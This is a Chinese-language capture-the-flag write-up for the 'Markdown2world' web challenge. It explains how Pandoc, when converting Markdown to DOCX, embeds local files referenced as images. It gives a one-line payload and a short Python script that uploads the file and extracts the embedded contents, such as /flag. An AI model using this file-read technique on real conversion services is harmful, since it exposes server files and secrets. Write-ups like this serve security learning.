# Markdown2world - VNCTF Writeup

## 题目信息
- 类型：Web
- 考点：Pandoc 任意文件读取

## 解题思路

题目是一个文档格式转换工具，使用 Pandoc 进行格式转换，支持将 Markdown 转换为 HTML、DOCX、RTF、EPUB、ODT 等格式。

### 漏洞原理

Pandoc 在将 Markdown 转换为 **DOCX** 格式时，会尝试将图片嵌入到文档中。如果图片路径指向本地文件，Pandoc 会读取该文件内容并嵌入到 DOCX 的 `word/media/` 目录中。

### 利用步骤

1. 创建恶意 Markdown 文件，使用图片语法引用目标文件：
```markdown
![aaa](/flag)
```

2. 上传并转换为 **DOCX** 格式

3. 下载生成的 DOCX 文件（本质是 ZIP），解压后在 `word/media/` 目录中获取文件内容

### Exploit

```python
import requests
import zipfile
import io

url = "http://target/convert.php"
payload = "![aaa](/flag)"

files = {'file': ('test.md', payload, 'text/markdown')}
data = {'toFormat': 'docx', 'fromFormat': ''}

resp = requests.post(url, files=files, data=data)
download_url = resp.json()['download_url']

docx = requests.get(f"http://target/{download_url}").content
with zipfile.ZipFile(io.BytesIO(docx)) as zf:
    for name in zf.namelist():
        if 'media' in name:
            print(zf.read(name).decode())
```

## Flag

```
VNCTF{fIIE_rEADIn9_Pandoc}
```
